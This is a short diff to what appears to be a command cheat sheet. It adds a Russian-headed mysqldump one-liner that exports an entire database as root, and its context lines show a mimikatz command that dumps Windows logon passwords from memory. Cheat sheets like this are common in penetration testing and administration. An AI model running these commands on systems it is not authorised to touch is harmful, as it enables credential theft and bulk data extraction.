@@ -400,3 +400,9 @@ mimikatz
 ```
 mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
+
+Выгрузить все данные из БД
+
+```
+mysqldump -u root -p --no-create-db --lock-tables=false --skip-add-locks --single-transaction –quick --skip-triggers <redacted> | gzip <redacted>.sql.gz
+```
